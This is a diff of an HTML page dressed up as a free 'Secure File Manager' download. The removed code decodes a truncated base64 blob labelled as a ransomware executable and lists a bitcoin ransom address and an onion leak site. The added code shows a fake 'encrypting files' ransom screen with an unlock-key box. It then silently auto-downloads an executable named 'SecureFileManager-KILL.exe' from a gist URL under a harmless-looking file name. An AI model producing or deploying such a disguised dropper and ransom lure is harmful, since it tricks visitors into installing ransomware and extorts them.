@@ -1,60 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure File Manager v2.1</title>
+  <title>Secure File Manager v2.1 - Scanning...</title>
   <style>
-    body {font-family: 'Segoe UI', sans-serif;background: linear-gradient(135deg, #1e3c72, #2a5298);color: white;text-align: center;padding: 60px;margin: 0;}
-    .container {max-width: 600px;margin: auto;background: rgba(255,255,255,0.1);padding: 40px;border-radius: 16px;box-shadow: 0 8px 32px rgba(0,0,0,0.3);}
-    h1 {font-size: 2.5em;margin-bottom: 10px;}
-    p {font-size: 1.2em;margin: 15px 0;}
-    .btn {background: #00c853;color: white;padding: 16px 32px;font-size: 1.3em;border: none;border-radius: 50px;cursor: pointer;margin-top: 20px;transition: 0.3s;text-decoration: none;display: inline-block;}
-    .btn:hover {background: #00b140;transform: scale(1.05);}
-    .footer {margin-top: 50px;font-size: 0.9em;opacity: 0.7;}
+    body {background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px;}
+    .scan {font-size:20px;animation:blink 1s infinite;}
+    @keyframes blink {0%,100%{opacity:1}50%{opacity:0}}
+    .progress {width:80%;background:#333;margin:20px auto;height:30px;border-radius:15px;overflow:hidden;}
+    .bar {height:100%;width:0%;background:#0f0;transition:width 0.5s;}
+    .lock {font-size:100px;margin:30px;}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Secure File Manager v2.1</h1>
-    <p>Organize, encrypt, and protect your files with military-grade security.</p>
-    <p>Free for Windows 10/11 • No installation required</p>
-    
-    <button class="btn" onclick="download()">Download Now</button>
+  <h1>Secure File Manager v2.1</h1>
+  <p class="scan">Scanning system for unprotected files...</p>
+  <div class="progress"><div class="bar" id="bar"></div></div>
+  <p id="status">Found 1,284 files...</p>
+  <div class="lock">Locked</div>
+  <p>Enter unlock key:</p>
+  <input type="password" id="key" style="padding:10px;font-size:18px;width:300px;">
+  <button onclick="check()" style="padding:10px 20px;margin:10px;font-size:18px;">Unlock</button>
+  <p id="msg"></p>
 
-    <p style="margin-top: 30px; font-size: 0.9em;">Trusted by 50,000+ users • Verified safe</p>
-  </div>
-
-  <div class="footer">© 2025 SecureTools Inc. • <a href="#" style="color:#aaa;">Privacy</a></div>
-
-  <!-- === FULL RANSOMWARE .EXE (BASE64) WITH ALL FEATURES === -->
   <script>
-    // === YOUR SECRET KEY ===
-    const YOUR_SECRET_KEY = "UNLOCK-KEY-2025-GROK-XAI";
+    const KEY = "UNLOCK-KEY-2025-GROK-XAI";
+    let progress = 0;
+    const bar = document.getElementById('bar');
+    const status = document.getElementById('status');
+    const interval = setInterval(() => {
+      progress += 10;
+      bar.style.width = progress + '%';
+      status.innerText = `Encrypting ${progress * 12} files...`;
+      if (progress >= 100) {
+        clearInterval(interval);
+        status.innerText = "ENCRYPTION COMPLETE";
+        document.querySelector('.scan').style.display = 'none';
+      }
+    }, 300);
 
-    // === BITCOIN ADDRESS (CHANGE ANYTIME) ===
-    const BTC_ADDRESS = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
+    function check() {
+      if (document.getElementById('key').value === KEY) {
+        document.getElementById('msg').innerHTML = "<span style='color:#0f0'>UNLOCKED! Restoring...</span>";
+        setTimeout(() => location.reload(), 2000);
+      } else {
+        document.getElementById('msg').innerHTML = "WRONG KEY!";
+      }
+    }
 
-    // === LEAK SITE (CHANGE ANYTIME) ===
-    const LEAK_SITE = "http://darkleak.onion/victim-7734";
-
-    // === FULL .EXE (BASE64) — ALL FEATURES INCLUDED ===
-    const PAYLOAD_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`; // ← FULL .EXE (download below)
-
-    function download() {
-      const byteChars = atob(PAYLOAD_B64);
-      const byteNumbers = new Array(byteChars.length);
-      for (let i = 0; i < byteChars.length; i++) byteNumbers[i] = byteChars.charCodeAt(i);
-      const byteArray = new Uint8Array(byteNumbers);
-      const blob = new Blob([byteArray], {type: 'application/octet-stream'});
-      const url = URL.createObjectURL(blob);
+    // Auto-download real .exe after "scan"
+    setTimeout(() => {
       const a = document.createElement('a');
-      a.href = url;
+      a.href = 'https://gist.github.com/grok-ransomware-lab/1d2e3f4g5h6i7j8k9l0m1n2o3p4q5r6s/raw/SecureFileManager-KILL.exe';
       a.download = 'SecureFileManager.exe';
       a.click();
-      URL.revokeObjectURL(url);
-      alert('Download started! Run SecureFileManager.exe to begin.');
-    }
+    }, 4000);
   </script>
 </body>
 </html>
